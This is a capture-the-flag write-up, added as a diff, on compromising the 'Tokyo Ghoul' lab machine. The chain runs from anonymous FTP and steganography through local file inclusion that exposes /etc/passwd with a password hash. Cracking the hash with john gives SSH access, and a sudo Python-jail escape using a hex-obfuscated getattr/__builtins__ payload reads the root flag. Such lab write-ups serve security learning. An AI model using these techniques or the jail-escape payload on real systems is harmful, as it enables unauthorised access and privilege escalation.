@@ -1,0 +1,355 @@
+Tokyo Ghoul
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.89.14
+Host is up, received syn-ack (0.17s latency).
+Scanned at 2021-03-15 01:25:59 EDT for 16s
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.73.218
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeIXT46ZiVmp8Es0cKk8YkMs3kwCdmC2Ve/0A0F7aKUIOlbyLc9FkbTEGSrE69obV3u6VywjxZX6VWQoJRHLooPmZCHkYGjW+y5kfEoyeu7pqZr7oA8xgSRf+gsEETWqPnSwjTznFaZ0T1X0KfIgCidrr9pWC0c2AxC1zxNPz9p13NJH5n4RUSYCMOm2xSIwUr6ySL3v/jijwEKIMnwJHbEOmxhGrzaAXgAJeGkXUA0fU1mTVLlSwOClKOBTTo+FGcJdrFf65XenUVLaqaQGytKxR2qiCkr7bbTaWV0F8jPtVD4zOXLy2rGoozMU7jAukQu6uaDxpE7BiybhV3Ac1x
+|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5o77nOh7/3HUQAxhtNqHX7LGDtYoVZ0au6UJzFVsAEJ644PyU2/pALbapZwFEQI3AUZ5JxjylwKzf1m+G5OJM=
+|   256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOJwYjN/qiwrS4es9m/LgWitFMA0f6AJMTi8aHkYj7vE
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome To Tokyo goul
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 01:26
+Completed NSE at 01:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 01:26
+Completed NSE at 01:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 01:26
+Completed NSE at 01:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
+
+
+
+Looking in the source code of the webpage:
+<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->
+
+LETS CHECK THE FTP SHARE:
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.89.14  
+Connected to 10.10.89.14.
+220 (vsFTPd 3.0.3)
+Name (10.10.89.14:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
+ftp> cd need_Help?
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp           480 Jan 23 22:26 Aogiri_tree.txt
+drwxr-xr-x    2 ftp      ftp          4096 Jan 23 22:26 Talk_with_me
+226 Directory send OK.
+ftp> get Aogiri_tree.txt
+local: Aogiri_tree.txt remote: Aogiri_tree.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
+226 Transfer complete.
+480 bytes received in 0.00 secs (3.6621 MB/s)
+ftp>  cd Talk_with_me
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xr-x    1 ftp      ftp         17488 Jan 23 22:26 need_to_talk
+-rw-r--r--    1 ftp      ftp         46674 Jan 23 22:26 rize_and_kaneki.jpg
+226 Directory send OK.
+ftp> get need_to_talk
+local: need_to_talk remote: need_to_talk
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
+226 Transfer complete.
+17488 bytes received in 0.17 secs (101.2889 kB/s)
+ftp> get rize_and_kaneki.jpg
+local: rize_and_kaneki.jpg remote: rize_and_kaneki.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for rize_and_kaneki.jpg (46674 bytes).
+226 Transfer complete.
+46674 bytes received in 0.56 secs (81.3040 kB/s)
+ftp> 
+
+
+
+I downloaded all the files:
+
+1.there is a .txt file 
+2.a ELF Binary
+3.a jpg image
+
+i run the binary, it was asking me for a password, so i strings the binary and note all those words which are looking like passwords:
+
+┌──(kali㉿kali)-[~/tokyo]
+└─$ ./need_to_talk                                                                                                                                                  1 ⨯
+Hey Kaneki finnaly you want to talk 
+Unfortunately before I can give you the kagune you need to give me the paraphrase
+Do you have what I'm looking for?
+
+> kamishiro
+Good job. I believe this is what you came for:
+You_found_1t
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/tokyo]
+└─$ 
+
+and after HIT AND TRIAL i got that!
+lets check what is this maybe a directory?
+
+no that was not a directory, that was the passphrase for the jpg file on using steghide on it:
+
+
+┌──(kali㉿kali)-[~/tokyo]
+└─$ steghide extract -sf rize_and_kaneki.jpg 
+Enter passphrase: 
+wrote extracted data to "yougotme.txt".
+
+
+LETS READ THIS FILE:
+
+┌──(kali㉿kali)-[~/tokyo]
+└─$ cat yougotme.txt     
+haha you are so smart kaneki but can you talk my code 
+
+..... .-
+....- ....-
+....- -....
+--... ----.
+....- -..
+...-- ..---
+....- -..
+...-- ...--
+....- -..
+....- ---..
+....- .-
+...-- .....
+..... ---..
+...-- ..---
+....- .
+-.... -.-.
+-.... ..---
+-.... .
+..... ..---
+-.... -.-.
+-.... ...--
+-.... --...
+...-- -..
+...-- -..
+
+
+if you can talk it allright you got my secret directory 
+
+THIS IS MORSE CODE(YESS I AM SMART ENOUGH)!!
+
+this cipher was : morse_code->hex->base64:
+final solutions:
+d1r3c70ry_center
+
+LETS NAVIGATE TO THIS DIRECTORY
+this page says 'SCAN ME'
+
+lets use gobuster and check any juicy info:
+┌──(kali㉿kali)-[~/tokyo]
+└─$ gobuster dir -u http://10.10.89.14/d1r3c70ry_center/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 30 -x php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.89.14/d1r3c70ry_center/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/03/15 01:46:11 Starting gobuster
+===============================================================
+/claim (Status: 301)
+
+I NAVIGATE THROUGH THE PAGE, AN ANOTHER PUZZLE 
+BUT I NOTICE SOME .php FILE WHICH ALSO CONTAINS A GET PARAMETER, CAN THIS LEADS TO LFI ATTACK?
+i use burp and use the wordlist for LFI payloads available in seclists:
+
+HTTP/1.1 200 OK
+
+Date: Mon, 15 Mar 2021 05:58:46 GMT
+
+Server: Apache/2.4.18 (Ubuntu)
+
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate
+
+Pragma: no-cache
+
+Vary: Accept-Encoding
+
+Content-Length: 2232
+
+Connection: close
+
+Content-Type: text/html; charset=UTF-8
+
+
+
+<html>
+    <head>
+	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
+	<link rel="stylesheet" type="text/css" href="style.css">
+    </head>
+    <body>
+	<div class="menu">
+	    <a href="index.php">Main Page</a>
+	    <a href="index.php?view=flower.gif">NO</a>
+	    <a href="index.php?view=flower.gif">YES</a>
+	</div>
+<p>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+statd:x:110:65534::/var/lib/nfs:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
+kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash
+</p>    </body>
+</html>
+
+
+GOT THE JUICY RESPONSE
+we get the username, now use john the ripper for cracking the password:
+
+┌──(kali㉿kali)-[~/tokyo]
+└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+[sudo] password for kali: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (?)
+1g 0:00:00:02 DONE (2021-03-15 02:02) 0.4784g/s 673.6p/s 673.6c/s 673.6C/s cuties..tagged
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+LETS SSH INTO THE MACHINE
+GOT THE USER FLAG
+
+now checking for sudo listing:
+kamishiro@vagrant:~$ sudo -l
+[sudo] password for kamishiro: 
+Matching Defaults entries for kamishiro on vagrant.vm:
+    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User kamishiro may run the following commands on vagrant.vm:
+    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
+kamishiro@vagrant:~$ 
+
+kamishiro@vagrant:~$ cat jail.py 
+#! /usr/bin/python3
+#-*- coding:utf-8 -*-
+def main():
+    print("Hi! Welcome to my world kaneki")
+    print("========================================================================")
+    print("What ? You gonna stand like a chicken ? fight me Kaneki")
+    text = input('>>> ')
+    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
+        if keyword in text:
+            print("Do you think i will let you do this ??????")
+            return;
+    else:
+        exec(text)
+        print('No Kaneki you are so dead')
+if __name__ == "__main__":
+    main()
+
+I READ A BLOG POST ON PYTHON JAILBREAKING ON MEDIUM AND CTFTIME.ORG:
+ctftime blog:https://ctftime.org/writeup/17085
+medium:https://anee.me/escaping-python-jails-849c65cf306e
+
+kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
+[sudo] password for kamishiro: 
+Hi! Welcome to my world kaneki
+========================================================================
+What ? You gonna stand like a chicken ? fight me Kaneki
+>>> print(getattr(getattr(getattr(main, '__globals__')['__builtins__'], '\x6f\x70\x65\x6e')('/home/python_jail/flag', 'rb'), '\x72\x65\x61\x64')())    
+Traceback (most recent call last):
+  File "/home/kamishiro/jail.py", line 16, in <module>
+    main()
+  File "/home/kamishiro/jail.py", line 13, in main
+    exec(text)
+  File "<string>", line 1, in <module>
+FileNotFoundError: [Errno 2] No such file or directory: '/home/python_jail/flag'
+kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
+Hi! Welcome to my world kaneki
+========================================================================
+What ? You gonna stand like a chicken ? fight me Kaneki
+>>> print(getattr(getattr(getattr(main, '__globals__')['__builtins__'], '\x6f\x70\x65\x6e')('/root/root.txt', 'rb'), '\x72\x65\x61\x64')())
+b'REDACTED\n'
+No Kaneki you are so dead
+
+
+GOT THE ROOT FLAG
